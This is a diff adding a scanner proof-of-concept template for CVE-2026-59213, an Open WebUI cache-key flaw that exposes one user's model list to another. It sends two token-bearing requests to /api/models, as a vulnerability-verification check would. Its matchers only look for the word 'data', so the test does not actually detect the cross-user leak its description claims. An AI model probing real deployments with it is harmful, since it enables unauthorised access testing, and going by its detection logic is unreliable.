@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 跨用户模型列表暴露漏洞：利用 aiocache key= 静态缓存键缺陷，在 TTL 窗口内通过两个不同用户令牌连续请求 /api/models，检测用户 B 是否收到用户 A 的权限过滤模型列表"
+id = "POC-AVE-2026-0812"
+name = "CVE-2026-59213 PoC"
+severity = "low"
+tags = ["ave-2026-0812"]
+vuln_id = [
+    "CVE-2026-59213",
+    "AVE-2026-0812",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/models"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{user_a_token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["data"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/models"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{user_b_token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["data"]
